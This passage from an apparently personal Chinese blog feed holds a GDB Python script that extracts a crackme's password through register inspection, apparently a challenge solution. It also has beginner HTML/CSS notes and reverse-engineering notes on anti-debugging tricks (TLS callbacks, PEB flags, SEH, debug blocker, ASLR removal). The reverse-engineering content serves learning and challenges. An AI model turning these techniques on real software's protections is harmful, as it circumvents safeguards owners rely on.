class="line">gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">rdx = gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line"></span><br><span class="line">password = <span class="string">&quot;&quot;</span> + <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">  gdb.execute(<span class="string">&#x27;run &lt;&lt;&lt; &#x27;</span>+password)</span><br><span class="line">  <span class="comment"># Continue to last character</span></span><br><span class="line">  <span class="keyword">for</span> i <span class="keyword">in</span> password:</span><br><span class="line">    gdb.execute(<span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">  <span class="keyword">try</span>:</span><br><span class="line">    rdx = gdb.execute(<span class="string">&#x27;info reg rdx&#x27;</span>,to_string=<span class="literal">True</span>)</span><br><span class="line">  <span class="keyword">except</span> gdb.error:</span><br><span class="line">    <span class="comment"># If info reg fails it is probably because the program has exited.</span></span><br><span class="line">    <span class="keyword">break</span></span><br><span class="line">  rdx = re.findall(<span class="string">&#x27;^rdx\s+\w+\s+(\d+)$&#x27;</span>, rdx)</span><br><span class="line">  password += <span class="built_in">chr</span>( <span class="built_in">int</span>(rdx[<span class="number">0</span>]) )</span><br><span class="line"></span><br><span class="line">print(<span class="string">&quot;Password found is :&quot;</span>+password)</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;quit&#x27;</span>)</span><br></pre></td></tr></table></figure><h3 id="论文-想法"><a href="#论文-想法" class="headerlink" title="论文 想法"></a>论文 想法</h3><p>云攻击</p><p>让VM支持去重，然后flush+reload</p><p>建立cpu cache的随机策略<br>映射</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x64-Nanomites-Introduction-WP&quot;&gt;&lt;a href=&quot;#ELF-x64-Nanomites-Introduction-WP&quot; class=&quot;headerlink&quot; title=&quot;ELF x64 - Nanomites - Introduction_WP&quot;&gt;&lt;/a&gt;ELF x64 - Nanomites - Introduction_WP&lt;/h2&gt;&lt;p&gt;这是运用了&lt;code&gt;Debug Blocker&lt;/code&gt;技术的题目&lt;br&gt;又花了些时间，终于破解了&lt;/p&gt;
&lt;h3 id=&quot;gdb-设置跟踪父进程还是子进程&quot;&gt;&lt;a href=&quot;#gdb-设置跟踪父进程还是子进程&quot; class=&quot;headerlink&quot; title=&quot;gdb  设置跟踪父进程还是子进程&quot;&gt;&lt;/a&gt;gdb  设置跟踪父进程还是子进程&lt;/h3&gt;&lt;p&gt;&lt;code&gt;set follow-fork-mode parrent|child&lt;/code&gt;&lt;br&gt;当发生fork时，指示调试器执行父进程还是子进程&lt;/p&gt;
&lt;h3 id=&quot;ptrace&quot;&gt;&lt;a href=&quot;#ptrace&quot; class=&quot;headerlink&quot; title=&quot;ptrace&quot;&gt;&lt;/a&gt;ptrace&lt;/h3&gt;&lt;p&gt;在程序执行到&lt;code&gt;int3&lt;/code&gt;时，就会触发 &lt;code&gt;SIGTRAP &lt;/code&gt;信号，&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>前端学习_html_css_1</title>
    <link href="http://finsenty54.github.io/2020/10/29/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0_html_css_1/"/>
    <id>http://finsenty54.github.io/2020/10/29/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0_html_css_1/</id>
    <published>2020-10-29T13:10:00.000Z</published>
    <updated>2020-10-31T08:53:12.096Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前端学习"><a href="#前端学习" class="headerlink" title="前端学习"></a>前端学习</h2><h3 id="html"><a href="#html" class="headerlink" title="html"></a>html</h3><h4 id="小知识"><a href="#小知识" class="headerlink" title="小知识"></a>小知识</h4><p><em>连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口</em></p><p><em>流（stream）代表一个客户端和服务端之间打开的连接。</em></p><p>？闭包作为参数？</p><a id="more"></a><hr><h4 id=""><a href="#" class="headerlink" title=""></a><!DOCTYPE html></h4><p>— 文档类型。混沌初分，HTML 尚在襁褓（大约是 1991/92 年）之时，DOCTYPE 用来链接一些 HTML 编写守则，比如自动查错之类。DOCTYPE 在当今作用有限，仅用于保证文档正常读取。现在知道这些就足够了。</p><h4 id="html-1"><a href="#html-1" class="headerlink" title="html"></a>html</h4><p><code>&lt;html&gt;</code> 元素。<br>该元素包含整个页面的内容，也称作根元素。</p><h4 id="head"><a href="#head" class="headerlink" title="head"></a>head</h4><p><code>&lt;head&gt;</code>元素。该元素的内容对用户不可见，其中包含例如面向搜索引擎的搜索关键字（keywords）、页面描述、CSS 样式表和字符编码声明等。</p><p><code>&lt;meta charset=&quot;utf-8&quot;&gt; </code><br>该元素指定文档使用 UTF-8 字符编码 ，UTF-8 包括绝大多数人类已知语言的字符。基本上 UTF-8 可以处理任何文本内容，还可以避免以后出现某些问题，没有理由再选用其他编码。</p><p><code>&lt;title&gt; </code>元素。该元素设置页面的标题，显示在浏览器标签页上，也作为收藏网页的描述文字。</p><h4 id="body"><a href="#body" class="headerlink" title="body"></a>body</h4><p><code>&lt;body&gt; </code>元素。该元素包含期望让用户在访问页面时看到的内容，包括文本、图像、视频、游戏、可播放的音轨或其他内容。</p><h4 id="img"><a href="#img" class="headerlink" title="img"></a>img</h4><pre><code>&lt;img src=&quot;images/firefox-icon.png&quot; alt=&quot;测试图片&quot;&gt;</code></pre><p><code>alt</code>，是图像的描述内容 属性<br><code>src</code>也是属性，资源</p><h4 id="列表list"><a href="#列表list" class="headerlink" title="列表list"></a>列表list</h4><p>ul无序<br>ol有序<br>列表的每个项目用一个列表项目（List Item）元素 <code>&lt;li&gt;</code> 包围</p><pre><code>&lt;ul&gt;  无序列表  &lt;li&gt;技术人员&lt;/li&gt;  &lt;li&gt;思考者&lt;/li&gt;  &lt;li&gt;建造者&lt;/li&gt;&lt;/ul&gt;</code></pre><hr><p>####a<br>链接非常重要 — 它们赋予 Web 网络属性。要植入一个链接，我们需要使用一个简单的元素 — <code>&lt;a&gt;</code> — a 是 “anchor” （锚）的缩写</p><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/about/manifesto/&quot;&gt;Mozilla 宣言&lt;/a&gt;</code></pre><p>href是属性</p><h4 id="测试本地文件"><a href="#测试本地文件" class="headerlink" title="测试本地文件"></a>测试本地文件</h4><p>它们具有服务端代码。 服务器端语言（如 PHP 或 Python）需要一个特殊的服务器来解释代码并提供结果。</p><p>层叠样式表（Cascading Style Sheet，简称：CSS）是为网页添加样式的代码<br>要选择一个 HTML 页面里所有的段落元素，然后将其中的文本改成红色，可以这样写 CSS<br>p {<br>  color: red;<br>}<br>再将该 CSS 文件连接至 HTML 文档，否则 CSS 代码不会对 HTML 文档在浏览器里的显示效果有任何影响</p><p>JavaScript（缩写：JS）是一门完备的 动态编程语言</p><p>对象：JavaScript 里一切皆对象，一切皆可储存在变量里。</p><p>例如disabled 属性，他们可以标记表单输入使之变为不可用(变灰色)，</p><p>实体引用： 在HTML中包含特殊字符</p><pre><code>&lt;    &amp;lt;&gt;    &amp;gt;&quot;    &amp;quot;&#39;    &amp;apos;&amp;    &amp;amp;</code></pre><h4 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h4><p>HTML中的内容置为注释，你需要将其用特殊的记号<code>&lt;!--</code>和<code>--&gt;</code>包括起来</p><h4 id="meta"><a href="#meta" class="headerlink" title="meta"></a>meta</h4><p>许多<code>&lt;meta&gt; </code>元素包含了name 和 content 特性：</p><p>name 指定了meta 元素的类型； 说明该元素包含了什么类型的信息。<br>content 指定了实际的元数据内容。</p><hr><h4 id="span"><a href="#span" class="headerlink" title="span"></a>span</h4><p>在你的站点增加自定义图标<br>这是一个 <code>&lt;span&gt; </code>元素，它<code>没有语义</code>。当您想要对它用CSS（或者JS）时，您可以用它包裹内容，且不需要附加任何额外的意义</p><hr><h4 id="文字样式"><a href="#文字样式" class="headerlink" title="文字样式"></a>文字样式</h4><p>无序<code>&lt;ul&gt;</code><br>有序 Ordered<br><code>&lt;ol&gt;</code> 元素<br>将一个列表嵌入到另一个列表是完全可以的<br>用<code>&lt;em&gt;</code>（emphasis）元素来标记斜体<br><code>&lt;strong&gt; </code>加粗<br><code>&lt;i&gt; </code>被用来传达传统上用斜体表达的意义：外国文字，分类名称，技术术语，一种思想……<br><code>&lt;b&gt;</code> 被用来传达传统上用粗体表达的意义：关键字，产品名称，引导句……<br><code>&lt;u&gt;</code> 被用来传达传统上用下划线表达的意义：专有名词，拼写错误……<br>不要用</p><h4 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h4><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;Mozilla 主页&lt;/a&gt;</code></pre><p>alt属性添加支持信息</p><pre><code>&lt;a href=&quot;https://www.mozilla.org/zh-CN/&quot;&gt;  &lt;img src=&quot;mozilla-image.png&quot; alt=&quot;链接至 Mozilla 主页的 Mozilla 标志&quot;&gt;&lt;/a&gt;</code></pre><p>可以有两个index.html文件，前提是他们在不同的目录下</p><p>指向上级目录： 如果你想在projects/index.html中包含一个指向pdfs/project-brief.pdf的超链接，你必须先返回上级目录，然后再回到pdf目录。“返回上一个目录级”使用两个英文点号表示 — <code>..</code> — 所以你应该使用的URL是<code> ../pdfs/project-brief.pdf</code></p><p>超链接除了可以链接到文档外，也可以链接到HTML文档的特定部分（被称为文档片段）。必须首先给要链接到的元素分配一个id属性</p><pre><code>&lt;a href=&quot;contacts.html#Mailing_address&quot;&gt;我们的地址&lt;/a&gt;&lt;a href=&quot;#Mailing_address&quot;&gt;</code></pre><p>当链接到同一网站的其他位置时，你应该使用相对链接（当链接到另一个网站时，你需要使用绝对链接<br>使用绝对URL时，浏览器首先通过DNS（见万维网是如何工作的）查找服务器的真实位置</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;https://download.mozilla.org/?product=firefox-latest-ssl&amp;os=win64&amp;lang=zh-CN&quot;</span></span></span><br><span class="line"><span class="tag">   <span class="attr">download</span>=<span class="string">&quot;firefox-latest-64bit-installer.exe&quot;</span>&gt;</span>  默认保存文件名</span><br></pre></td></tr></table></figure><hr><h4 id="网站结构"><a href="#网站结构" class="headerlink" title="网站结构"></a>网站结构</h4><p>创建网站的一种常见方式——每一页都使用相同的页面结构，包括相同的导航菜单</p><pre><code>&lt;a href=&quot;mailto:nowhere@mozilla.org&quot;&gt;向 nowhere 发邮件&lt;/a&gt;</code></pre><p>使用上标和下标。 <code>&lt;sup&gt;</code> 和<code>&lt;sub&gt;</code>元素可</p><pre><code>&lt;p&gt;如果 x&lt;sup&gt;2&lt;/sup&gt; 的值为 9，那么 x 的值必为 3 或 -3。&lt;/p&gt;</code></pre><p>为了实现语义化标记，HTML 提供了明确这些区段的专用标签，例如：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">header</span>&gt;</span>：页眉。</span><br><span class="line"><span class="tag">&lt;<span class="name">nav</span>&gt;</span>：导航栏。</span><br><span class="line"><span class="tag">&lt;<span class="name">main</span>&gt;</span>：主内容。主内容中还可以有各种子内容区段，可用<span class="tag">&lt;<span class="name">article</span>&gt;</span>、<span class="tag">&lt;<span class="name">section</span>&gt;</span> 和 <span class="tag">&lt;<span class="name">div</span>&gt;</span> 等元素表示。</span><br><span class="line"><span class="tag">&lt;<span class="name">aside</span>&gt;</span>：侧边栏，经常嵌套在 <span class="tag">&lt;<span class="name">main</span>&gt;</span> 中。</span><br><span class="line"><span class="tag">&lt;<span class="name">footer</span>&gt;</span>：页脚。</span><br></pre></td></tr></table></figure><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">span</span>&gt;</span> 是一个内联的（inline）无语义元素，使用 class 属性提供一些标签，使这些元素能易于查询</span><br><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span> 是一个块级无语义元素，应仅用于找不到更好的块级元素时，或者不想增加特定的意义时</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">br</span>&gt;</span> 可在段落中进行换行</span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span> 元素在文档中生成一条水平分割线</span><br></pre></td></tr></table></figure><p><code>&lt;iframe&gt;</code><br>元素旨在允许您将其他Web文档嵌入到当前文档中</p><h3 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h3><p>给 HTML 元素加个类名（class），在 CSS 中再选中那个类名</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;special&quot;</span>&gt;</span></span><br><span class="line">css中</span><br><span class="line">.special &#123;</span><br><span class="line">  color: orange;</span><br><span class="line">  font-weight: bold;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><hr><h4 id="选择器"><a href="#选择器" class="headerlink" title="选择器"></a>选择器</h4><p>重要：：选择嵌套在<code>&lt;li&gt;</code> 元素内的<code>&lt;em&gt;</code>我们可以使用一个称为包含选择符的选择器，它只是单纯地在两个选择器之间加上一个空格</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">li</span> <span class="selector-tag">em</span> &#123;</span><br><span class="line">  <span class="attribute">color</span>: rebeccapurple;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>设置直接出现在标题后面并且与标题具有相同层级的段落样式，为此需在两个选择器之间添加一个 + 号 (成为 相邻选择符)</p><p>根据状态确定样式</p><pre><code>a:linka:hoverarticle p span &#123; ... &#125;h1 + ul + p &#123; ... &#125;</code></pre><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">body</span> <span class="selector-tag">h1</span> + <span class="selector-tag">p</span> <span class="selector-class">.special</span> &#123;</span><br><span class="line">在&lt;body&gt;之内，紧接在&lt;h1&gt;后面的&lt;p&gt;元素的内部，类名为special。</span><br></pre></td></tr></table></figure><hr><h4 id="css属性"><a href="#css属性" class="headerlink" title="css属性"></a>css属性</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">font-size</span></span><br><span class="line"><span class="selector-tag">width</span></span><br><span class="line"><span class="selector-tag">background-color</span></span><br><span class="line"><span class="selector-tag">color</span></span><br><span class="line"><span class="selector-tag">border</span></span><br></pre></td></tr></table></figure><p><code>calc()</code>函数 进行简单计算<br><code>rotate()</code></p><hr><h4 id="额外样式表"><a href="#额外样式表" class="headerlink" title="额外样式表"></a>额外样式表</h4><p>将额外的样式表导入主CSS样式表，可以使用@import:<br><code>@import &#39;styles2.css&#39;;</code></p><h4 id="规则"><a href="#规则" class="headerlink" title="规则"></a>规则</h4><p>应用两条<code>同级别</code>的规则（相同规则）<br><code>理解为后面的规则覆盖前面的规则</code></p><p>有不同选择器对应相同的元素的时候需要使用哪个规则<br><code>一个元素选择器比类选择器的优先级更低会被其覆盖</code></p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">千位： 如果声明在 <span class="selector-tag">style</span> 的属性（内联样式）则该位得一分。这样的声明没有选择器，所以它得分总是1000。</span><br><span class="line">百位： 选择器中包含<span class="selector-tag">ID</span>选择器则该位得一分。</span><br><span class="line">十位： 选择器中包含类选择器、属性选择器或者伪类则该位得一分。</span><br><span class="line">个位：选择器中包含元素、伪元素选择器则该位得一分。</span><br></pre></td></tr></table></figure><h4 id="class-id"><a href="#class-id" class="headerlink" title="class id"></a>class id</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;div id=&quot;outer&quot; class=&quot;container&quot;&gt;</span><br><span class="line"><span class="selector-id">#outer</span> <span class="selector-tag">a</span> &#123;</span><br><span class="line">    <span class="attribute">background-color</span>: red;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>id 对应<code> #outer</code><br>class对应<code>.container</code></p><h4 id="盒子"><a href="#盒子" class="headerlink" title="盒子"></a>盒子</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">标题(&lt;<span class="selector-tag">h1</span>&gt;等)和段落(&lt;<span class="selector-tag">p</span>&gt;)默认情况下都是块级的盒子</span><br><span class="line">做链接的 &lt;<span class="selector-tag">a</span>&gt; 元素、 &lt;<span class="selector-tag">span</span>&gt;、 &lt;<span class="selector-tag">em</span>&gt; 以及 &lt;<span class="selector-tag">strong</span>&gt; 都是默认处于 <span class="selector-tag">inline</span> 状态的</span><br><span class="line">＜<span class="selector-tag">div</span>＞块级元素</span><br><span class="line">盒子<span class="selector-tag">display</span> 属性的设置，比如 <span class="selector-tag">inline</span> 或者 <span class="selector-tag">block</span> ，来控制盒子的外部显示类型</span><br><span class="line">在标准模型中，如果你给盒设置 <span class="selector-tag">width</span> 和 <span class="selector-tag">height</span>，实际设置的是 <span class="selector-tag">content</span> <span class="selector-tag">box</span></span><br></pre></td></tr></table></figure><p><a href="https://imgchr.com/i/BJ5qkq"><img src="https://s1.ax1x.com/2020/10/29/BJ5qkq.jpg" alt="BJ5qkq.jpg"></a><br>替代盒模型，width就是盒的宽度，而不是content的宽度</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">html</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: border-box;</span><br><span class="line">&#125;</span><br><span class="line">*, *<span class="selector-pseudo">::before</span>, *<span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">box-sizing</span>: inherit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>有两个外边距相接的元素，这些外边距将合并为一个外边距，即最大的单个外边距的大小</p><hr><h4 id="inline-block"><a href="#inline-block" class="headerlink" title="inline-block"></a>inline-block</h4><p>元素使用 display: inline-block，实现我们需要的块级的部分效果：</p><p>设置width 和height 属性会生效。<br>padding, margin, 以及border 会推开其他元素。</p><hr><h4 id="背景图像"><a href="#背景图像" class="headerlink" title="背景图像"></a>背景图像</h4><p>默认情况下，大图不会缩小以适应方框，因此我们只能看到它的一个小角，而小图则是平铺以填充方框</p><p><code>background-repeat</code>属性用于控制图像的平铺行为</p><p><code>background-size</code>属性，它可以设置长度或百分比值，来调整图像的大小以适应背景</p><p>背景是指定他们如何滚动时，内容滚动。这是由<code>background-attachment</code>属性控制的</p><p><code>border-radius</code>属性和与方框的每个角相关的长边来实现方框的圆角</p><p><code>background-color:rgba(0,0,0,.5);</code><br>RGBA颜色　第四个值表示颜色的alpha通道，它控制<code>不透明度</code>。如果将这个值设置为0，它将使颜色完全透明<br>半透明的黑色背景颜色</p><h4 id="溢出"><a href="#溢出" class="headerlink" title="溢出"></a>溢出</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="selector-tag">overflow</span>属性</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">hidden</span>　隐藏掉溢出</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">scroll</span>　你的浏览器总会显示滚动条</span><br><span class="line"><span class="selector-tag">overflow-x</span>　　　－ｙ</span><br><span class="line"><span class="selector-tag">overflow</span>: <span class="selector-tag">auto</span>　　</span><br></pre></td></tr></table></figure><h4 id="绝对长度单位"><a href="#绝对长度单位" class="headerlink" title="绝对长度单位"></a>绝对长度单位</h4><p><code>px    像素　＝1/96ｃｍ</code></p><h4 id="相对长度单位"><a href="#相对长度单位" class="headerlink" title="相对长度单位"></a>相对长度单位</h4><p><code>em</code>    在 font-size 中使用是相对于父元素的字体大小，在其他属性中使用是相对于自身的字体大小，如 width</p><p>总是想让它至少有个确定的高度，你应该给它设置一个min-height属性</p><h4 id="图片溢出"><a href="#图片溢出" class="headerlink" title="图片溢出"></a>图片溢出</h4><p>一张图片的max-width设为100%。<br><code>max－width:100%　　</code>指的是父容器宽度的百分数<br>技术是用来让图片可响应的，所以在更小的设备上浏览的时候，它们会合适地缩放，但会先加载大的图像，在缩放</p><p>主页cargo-generate</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;前端学习&quot;&gt;&lt;a href=&quot;#前端学习&quot; class=&quot;headerlink&quot; title=&quot;前端学习&quot;&gt;&lt;/a&gt;前端学习&lt;/h2&gt;&lt;h3 id=&quot;html&quot;&gt;&lt;a href=&quot;#html&quot; class=&quot;headerlink&quot; title=&quot;html&quot;&gt;&lt;/a&gt;html&lt;/h3&gt;&lt;h4 id=&quot;小知识&quot;&gt;&lt;a href=&quot;#小知识&quot; class=&quot;headerlink&quot; title=&quot;小知识&quot;&gt;&lt;/a&gt;小知识&lt;/h4&gt;&lt;p&gt;&lt;em&gt;连接 80 端口需要管理员权限（非管理员用户只能监听大于 1024 的端口&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;流（stream）代表一个客户端和服务端之间打开的连接。&lt;/em&gt;&lt;/p&gt;
&lt;p&gt;？闭包作为参数？&lt;/p&gt;</summary>
    
    
    
    
    <category term="FRONT-END" scheme="http://finsenty54.github.io/tags/FRONT-END/"/>
    
  </entry>
  
  <entry>
    <title>nice try</title>
    <link href="http://finsenty54.github.io/2020/10/27/nice_try/"/>
    <id>http://finsenty54.github.io/2020/10/27/nice_try/</id>
    <published>2020-10-27T07:34:42.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="lt-逆向工程-核心原理-gt-终结"><a href="#lt-逆向工程-核心原理-gt-终结" class="headerlink" title="&lt;逆向工程-核心原理&gt;终结"></a>&lt;逆向工程-核心原理&gt;终结</h2><p><strong>看了两三年，终于看完了，</strong><code>nice try </code>2020-10-27 15:20:20 星期二  :tw-1f4aa:</p><p><em>接下来的是阅读过程中的一些笔记</em></p><a id="more"></a><hr><h3 id="内核调试"><a href="#内核调试" class="headerlink" title="内核调试"></a>内核调试</h3><p>终端中输入 <code>bcdedit -debug on</code><br>开启内核调试模式</p><h3 id="WINDBG"><a href="#WINDBG" class="headerlink" title="WINDBG"></a>WINDBG</h3><pre><code>lkd&gt; u nt!ZwCreateFile L50</code></pre><p>查看createfile 代码<br>u 反汇编 u L10显示10行命令</p><p>db命令<br>d-display</p><hr><h3 id="删除ASLR功能"><a href="#删除ASLR功能" class="headerlink" title="删除ASLR功能"></a>删除ASLR功能</h3><p>将选择头中的DLL Characteristics中DYNAMIC_BASE标志删除即可</p><hr><h3 id="TLS回调函数"><a href="#TLS回调函数" class="headerlink" title="TLS回调函数"></a>TLS回调函数</h3><p>长用于反调试<br>类似于linux <code>ptrace() </code>函数</p><p>每当创建/终止进程的线程时会自动调用执行的函数。创建进程的主线程会先于EP代码，调用回调函数</p><p>在选择头中有TLS表地址，里面是tls结构体的地址，可能有多个结构体，<code>address of callbacks</code>成员指向tls函数地址</p><hr><h3 id="isDebuggerPersent"><a href="#isDebuggerPersent" class="headerlink" title="isDebuggerPersent()"></a>isDebuggerPersent()</h3><p>检查<code>peb.deingdebugged</code>值，<code>+02</code>处<br>判断是否处于调试</p><p><code>getmodulehandle()</code><br>获取进程imagebase</p><hr><h3 id="windbg-配置符号表"><a href="#windbg-配置符号表" class="headerlink" title="windbg 配置符号表"></a>windbg 配置符号表</h3><p>srv*<a href="https://msdl.microsoft.com/download/symbols">https://msdl.microsoft.com/download/symbols</a><br>通知 WinDbg 进行符号文件的初始查找和加载：<br>.reload<br>Lm 查看已加载模块</p><p><code>dt </code><br>displays information about a local variable, global variable or data type</p><p>dt _teb<br>dt _peb<br>dt _peb_ldr_data</p><hr><h3 id="PEB"><a href="#PEB" class="headerlink" title="PEB"></a>PEB</h3><p>模块=dll加载后，通过PEB.ldr 直接获取该模块的加载基地址</p><p><code>FS:[0]</code> TEB起始地址</p><p><code>FS:[30]</code> PEB起始地址</p><hr><h3 id="利用SEH机制的反调试技术"><a href="#利用SEH机制的反调试技术" class="headerlink" title="利用SEH机制的反调试技术"></a>利用SEH机制的反调试技术</h3><p>程序在正常运行和调试运行时表现出的行为动作是不同的<br>正常：程序自己处理<br>调试时：抛给调试器处理</p><p>通过<code>TEB.NtTib.ExceptionList </code>找到SEH链</p><pre><code>TEB.NtTib.ExceptionList =FS：[0]</code></pre><hr><p>结构体 构成链</p><pre><code>* next_seh* handler</code></pre><p>esp+c 即指向 pContext<br>seh函数参数第三个为<code>指向pContext的指针</code>，保存<code>线程寄存器值</code>，执行其他进程就会保存寄存器值。<br><code>*pContext+B8 </code>(32位下）为EIP值， <code>修改EIP</code>，改变执行流程<br>一样，通过<code>PEB.isdebuggerpersent()</code>API 取得beingDebugged值判断</p><hr><h3 id="保护器，压缩器"><a href="#保护器，压缩器" class="headerlink" title="保护器，压缩器"></a>保护器，压缩器</h3><p> 反调试–一个更简单，更好的方法：判断当前系统是否是为逆向分析专用系统</p><pre><code>findWindow() , createTOOLhelp32SnapsHOT(), GETcomputerName()</code></pre><h3 id="OllyDBG-view-seh-chain"><a href="#OllyDBG-view-seh-chain" class="headerlink" title="OllyDBG view-seh chain"></a>OllyDBG view-seh chain</h3><p><code>PEB.ImageBase</code> 保存进程的实际映射地址</p><h3 id="debug-blocker"><a href="#debug-blocker" class="headerlink" title="debug blocker"></a>debug blocker</h3><ol><li><p>被调试进程不能被其他进程调试</p></li><li><p>调试器操作被调试者的代码</p></li><li><p>调试器处理被调试进程中发生的异常</p></li></ol><h3 id="clbp"><a href="#clbp" class="headerlink" title="clbp"></a>clbp</h3><p>ollydgb的<code>条件记录断点</code><br>ctrl+G 将光标移到4011f0地址后，按shift+f4，打开设置CLBP对话框（条件断点）</p><p>detach 分离</p><pre><code>EB FE 无限循环</code></pre><p><code>DebugActiveProcessStop()</code><br>将被调试者从调试器中分离出来</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;lt-逆向工程-核心原理-gt-终结&quot;&gt;&lt;a href=&quot;#lt-逆向工程-核心原理-gt-终结&quot; class=&quot;headerlink&quot; title=&quot;&amp;lt;逆向工程-核心原理&amp;gt;终结&quot;&gt;&lt;/a&gt;&amp;lt;逆向工程-核心原理&amp;gt;终结&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;看了两三年，终于看完了，&lt;/strong&gt;&lt;code&gt;nice try &lt;/code&gt;2020-10-27 15:20:20 星期二  :tw-1f4aa:&lt;/p&gt;
&lt;p&gt;&lt;em&gt;接下来的是阅读过程中的一些笔记&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="RCE" scheme="http://finsenty54.github.io/tags/RCE/"/>
    
  </entry>
  
  <entry>
    <title>ELF_x64_Nanomites_Introduction</title>
    <link href="http://finsenty54.github.io/2020/10/26/ELF_x64_Nanomites_Introduction/"/>
    <id>http://finsenty54.github.io/2020/10/26/ELF_x64_Nanomites_Introduction/</id>
    <published>2020-10-26T02:08:58.000Z</published>
    <updated>2020-10-31T08:53:12.112Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x64-Nanomites-Introduction"><a href="#ELF-x64-Nanomites-Introduction" class="headerlink" title="ELF x64 - Nanomites - Introduction"></a>ELF x64 - Nanomites - Introduction</h2><h3 id="mmap"><a href="#mmap" class="headerlink" title="mmap"></a>mmap</h3><p><del>mmap只是在虚拟内存分配了地址空间，只有在第一次访问虚拟内存的时候才分配物理内存。</del></p><pre><code>void *mmap(void *addr, size_t length, int prot, int flags, int fd, off_t offset);</code></pre><a id="more"></a><p>在虚拟地址空间中为所调用进程创建一个新的映射。开始地址为addr，长度为length<br>内核在靠近页边界的地方，尝试创建。如果已有映射在此，就不用addr，会返回新地址</p><p>The contents of a <code>file mapping </code>(as opposed to an anonymous mapping;<br>       see MAP_ANONYMOUS below), are initialized using <code>length bytes s</code>tarting<br>       at <code>offset </code>offset in the file (or other object) referred to by the<br>       <code>file descriptor</code> fd. </p><hr><p><code>prot</code>参数描述所需的内存保护</p><p> The <code>flags</code> argument determines whether updates to the mapping are<br>       visible to other processes mapping the same region, and whether<br>       updates are carried through to the underlying file.</p><p>mmap 